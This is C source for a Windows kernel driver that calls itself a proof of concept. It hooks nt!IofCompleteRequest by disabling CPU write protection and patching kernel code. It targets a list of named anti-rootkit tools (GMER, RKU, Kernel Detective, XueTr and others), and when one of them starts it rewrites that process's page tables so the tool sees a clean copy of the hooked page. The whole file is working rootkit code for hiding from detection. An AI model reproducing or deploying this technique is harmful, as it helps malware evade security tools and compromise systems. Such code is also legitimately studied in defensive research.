#include "stdafx.h"
ULONG m_PhysicalPageSize = 0;

PVOID m_KernelBase = NULL;
ULONG m_KernelSize = 0;

PVOID m_TargetAddr = NULL;
ULONG m_TargetSize = 0;

MAPPED_MDL m_TargetMemContents;
PHYSICAL_ADDRESS m_TargetMemPhysicalAddr;

typedef NTSTATUS (__fastcall * func_IofCompleteRequest)(
	PIRP Irp,
	CCHAR PriorityBoost
	);
// stuff for function code patching
func_IofCompleteRequest old_IofCompleteRequest = NULL;
ULONG IofCompleteRequest_BytesPatched = 0;
func_IofCompleteRequest f_IofCompleteRequest = NULL;

/*
    List of known antirootkits to bypass
*/
PWSTR m_wcKnownProcesses[] = 
{
    L"*\\RKU*.EXE",
    L"*\\KERNEL DETECTIVE.EXE",
    L"*\\GMER.EXE",
    L"*\\CMCARK*.EXE",
	L"*\\XUETR.EXE"
};

typedef struct _PROCESSES_LIST_ENTRY
{
    struct _PROCESSES_LIST_ENTRY *next, *prev;
    PEPROCESS Process;
} PROCESSES_LIST_ENTRY,*PPROCESSES_LIST_ENTRY;

PPROCESSES_LIST_ENTRY process_list_head = NULL, process_list_end = NULL;
KSPIN_LOCK m_ListLock;
//--------------------------------------------------------------------------------------
wchar_t chrlwr_w(wchar_t chr)
{
	if ((chr >= 'A') && (chr <= 'Z')) 
	{
		return chr + ('a'-'A');
	}

	return chr;
}
//--------------------------------------------------------------------------------------
BOOLEAN IsKnownProcess(PUNICODE_STRING usName)
{
	// enumerate known modules
	size_t i;
	for (i = 0; i < sizeof(m_wcKnownProcesses) / sizeof(PWSTR); i++)
	{
		UNICODE_STRING usExpression;
		RtlInitUnicodeString(&usExpression, m_wcKnownProcesses[i]);

		// match name by mask
		if (FsRtlIsNameInExpression(&usExpression, usName, TRUE, NULL))
		{
			return TRUE;
		}
	}

	return FALSE;
}
//--------------------------------------------------------------------------------------
PPROCESSES_LIST_ENTRY process_info_save(PEPROCESS Process)
{
	PPROCESSES_LIST_ENTRY ret = NULL;
	KIRQL OldIrql;
	KeAcquireSpinLock(&m_ListLock, &OldIrql);

	__try
	{
		// allocate single list entry
		PPROCESSES_LIST_ENTRY e = (PPROCESSES_LIST_ENTRY)M_ALLOC(sizeof(PROCESSES_LIST_ENTRY));
		if (e)
		{
			RtlZeroMemory(e, sizeof(PROCESSES_LIST_ENTRY));            

			ObReferenceObject(Process);
			e->Process = Process;            

			// add it to list
			if (process_list_end)
			{
				process_list_end->next = e;
				e->prev = process_list_end;
				process_list_end = e;
			} 
			else 
			{
				process_list_end = process_list_head = e;    
			}

			ret = e;
		}   
		else
		{
			DbgMsg(__FILE__, __LINE__, "M_ALLOC() fails\n");
		}
	}    
	__finally
	{
		KeReleaseSpinLock(&m_ListLock, OldIrql);
	}  

	return ret;
}
//--------------------------------------------------------------------------------------
PPROCESSES_LIST_ENTRY process_info_find(PEPROCESS Process)
{
	PPROCESSES_LIST_ENTRY ret = NULL;
	KIRQL OldIrql;
	KeAcquireSpinLock(&m_ListLock, &OldIrql);

	__try
	{
		PPROCESSES_LIST_ENTRY e = process_list_head;

		while (e)
		{
			if (e->Process == Process)
			{                
				ret = e;
				break;
			}

			e = e->next;
		}
	}    
	__finally
	{
		KeReleaseSpinLock(&m_ListLock, OldIrql);
	}

	return ret;
}
//--------------------------------------------------------------------------------------
void process_info_del(PPROCESSES_LIST_ENTRY e)
{
	KIRQL OldIrql;
	KeAcquireSpinLock(&m_ListLock, &OldIrql);

	__try
	{
		// delete single entry from list
		if (e->prev)
			e->prev->next = e->next;

		if (e->next)
			e->next->prev = e->prev;

		if (process_list_head == e)
			process_list_head = e->next;

		if (process_list_end == e)
			process_list_end = e->prev;

		ObDereferenceObject(e->Process);

		M_FREE(e);
	}    
	__finally
	{
		KeReleaseSpinLock(&m_ListLock, OldIrql);
	}
}


//--------------------------------------------------------------------------------------
void ProcessNotifyRoutine(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create)
{
    PPROCESSES_LIST_ENTRY e = NULL;

    // get process pointer
    PEPROCESS Process = NULL;
    NTSTATUS ns = PsLookupProcessByProcessId(ProcessId, &Process);
    if (NT_SUCCESS(ns))
    {  
        if (Create)
        {                           
            // get process image path
            UNICODE_STRING ImagePath;
            if (GetProcessFullImagePath(Process, &ImagePath))
            {                                
                if (IsKnownProcess(&ImagePath))
                {
					KAPC_STATE ApcState;
                    DbgMsg(
                        __FILE__, __LINE__, "PROCESS: 0x%.8x PID=%.5d '%wZ'\n", 
                        Process, ProcessId, &ImagePath
                    );
                    KeStackAttachProcess(Process, &ApcState);       

                    // set faked PFN's for target module
                    if (SetPfnsForAddress(
                        m_TargetAddr, 
                        m_TargetSize / PAGE_SIZE, 
                        &m_TargetMemPhysicalAddr))
                    {
                        // save process info
                        e = process_info_save(Process);
                        DbgMsg(__FILE__, __LINE__, "Process page tables is modified!\n");
                    }

                    KeUnstackDetachProcess(&ApcState);
                }

                RtlFreeUnicodeString(&ImagePath);
            }            
        }
        else if (e = process_info_find(Process))
        {
            // delete saved process information entry
            process_info_del(e);
            DbgMsg(__FILE__, __LINE__, "PROCESS: "IFMT" (EXIT)\n", Process);
        }

        ObDereferenceObject(Process);
    } 
    else 
    {
        DbgMsg(__FILE__, __LINE__, "PsLookupProcessByProcessId() fails; status: 0x%.8x\n", ns);
    }    
}
//--------------------------------------------------------------------------------------
NTSTATUS __fastcall new_IofCompleteRequest(
    PIRP Irp,
    CCHAR PriorityBoost)
{
    /*
        Just a handler for a test hook
    */
	NTSTATUS ns;
    if (Irp->IoStatus.Status == STATUS_SUCCESS &&
        KeGetCurrentIrql() == PASSIVE_LEVEL)
    {
        PIO_STACK_LOCATION Stack = IoGetCurrentIrpStackLocation(Irp);
        if (Stack->MajorFunction == IRP_MJ_CREATE &&
            Stack->FileObject)
        {
            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): IRP_MJ_CREATE (DevObj="IFMT")\n", Stack->DeviceObject);            
        }
    }

     ns = old_IofCompleteRequest(
        Irp,
        PriorityBoost
    );

    return ns;
}
NTSTATUS PageHackTest()
{
	ULONG RetSize = 0;
	SYSTEM_BASIC_INFORMATION BasicInfo;
	ULONG RVA;
	PIMAGE_NT_HEADERS pHeaders;
	NTSTATUS ns = ZwQuerySystemInformation(SystemBasicInformation, &BasicInfo, sizeof(BasicInfo), &RetSize);
	if (!NT_SUCCESS(ns))
	{
		DbgMsg(__FILE__, __LINE__, "ZwQuerySystemInformation() fails; status: 0x%.8x\n", ns);
		return STATUS_UNSUCCESSFUL;
	}

	m_PhysicalPageSize = BasicInfo.PhysicalPageSize;
	DbgMsg(__FILE__, __LINE__, "Physical page size is 0x%.8x\n", m_PhysicalPageSize);    

	// test for enabled PAE
	if (GetCR4() & PAE_ON)
	{
		DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): PAE is ON\n");
	}
	else
	{
		DbgMsg(__FILE__, __LINE__, "ERROR: PAE must be enabled to run this PoC\n");
		return STATUS_UNSUCCESSFUL;
	}

	// find target module base
	m_KernelBase = KernelGetModuleBase("ntoskrnl.exe");
	if (m_KernelBase == NULL)
	{
		DbgMsg(__FILE__, __LINE__, "KernelGetModuleBase() fails\n");
		return STATUS_UNSUCCESSFUL;
	}

	pHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)m_KernelBase + 
		((PIMAGE_DOS_HEADER)m_KernelBase)->e_lfanew);

	m_KernelSize = XALIGN_UP(pHeaders->OptionalHeader.SizeOfImage, PAGE_SIZE);

	DbgMsg(__FILE__, __LINE__, "Kernel is at "IFMT" (0x%.8x bytes)\n", m_KernelBase, m_KernelSize);        

	// get address of nt!IofCompleteRequest()
	RVA = KernelGetExportAddress(m_KernelBase, "IofCompleteRequest");
	if (RVA == 0)
	{
		DbgMsg(__FILE__, __LINE__, "ERROR: Unable to found nt!IofCompleteRequest()\n");
		return STATUS_UNSUCCESSFUL;
	}    

	// get address of nt!IofCompleteRequest()
	f_IofCompleteRequest = (func_IofCompleteRequest)RVATOVA(m_KernelBase, RVA);
	DbgMsg(__FILE__, __LINE__, "nt!IofCompleteRequest() is at "IFMT"\n", f_IofCompleteRequest);

	m_TargetAddr = (PVOID)XALIGN_DOWN((ULONG)f_IofCompleteRequest, PAGE_SIZE);
	m_TargetSize = PAGE_SIZE;

	DbgMsg(
		__FILE__, __LINE__, 
		"Target memory region is at "IFMT" (0x%.8x bytes)\n", 
		m_TargetAddr, m_TargetSize
		);        

	// allocate memory for faked data
	if (!AllocateKernelMemory(XALIGN_UP(m_TargetSize, PAGE_SIZE_2M), &m_TargetMemContents))
	{
		DbgMsg(__FILE__, __LINE__, "AllocateKernelMemory() fails\n");
		return STATUS_UNSUCCESSFUL;
	}

	CopyKernelMemory(m_TargetMemContents.MappedBuffer, m_TargetAddr, m_TargetSize);

	m_TargetMemPhysicalAddr = MmGetPhysicalAddress(m_TargetMemContents.MappedBuffer);

	DbgMsg(
		__FILE__, __LINE__, "Faked memory at "IFMT" (0x%.8x`%.8x)\n", 
		m_TargetMemContents.MappedBuffer, 
		m_TargetMemPhysicalAddr.HighPart, 
		m_TargetMemPhysicalAddr.LowPart
		);

	KeInitializeSpinLock(&m_ListLock);

	// set up notify on process creation
	ns = PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, FALSE);
	if (!NT_SUCCESS(ns))
	{
		DbgMsg(__FILE__, __LINE__, "PsSetCreateProcessNotifyRoutine() fails; status: 0x%.8x\n", ns);        
		FreeKernelMemory(&m_TargetMemContents);
		return STATUS_UNSUCCESSFUL;
	}

	// disable memory write protection
	ForEachProcessor(ClearWp, NULL);                

	// set up our test hook
	old_IofCompleteRequest = (func_IofCompleteRequest)HookCode(
		f_IofCompleteRequest,
		new_IofCompleteRequest,
		&IofCompleteRequest_BytesPatched
		);

	// enable memory write protection
	ForEachProcessor(SetWp, NULL);  
	return STATUS_SUCCESS;
}

void UnLoadPageHack()
{
	LARGE_INTEGER Timeout = { 0 };
	DbgMsg(__FILE__, __LINE__, "DriverUnload()\n");    

	if (f_IofCompleteRequest &&
		old_IofCompleteRequest &&
		IofCompleteRequest_BytesPatched > 0)
	{        
		// disable memory write protection
		ForEachProcessor(ClearWp, NULL);                

		// remove hook
		RtlCopyMemory(f_IofCompleteRequest, old_IofCompleteRequest, IofCompleteRequest_BytesPatched);

		// enable memory write protection
		ForEachProcessor(SetWp, NULL);
	}

	
	Timeout.QuadPart = RELATIVE(SECONDS(1));
	KeDelayExecutionThread(KernelMode, FALSE, &Timeout);

	// remove notify routines
	PsSetCreateProcessNotifyRoutine(ProcessNotifyRoutine, TRUE);
}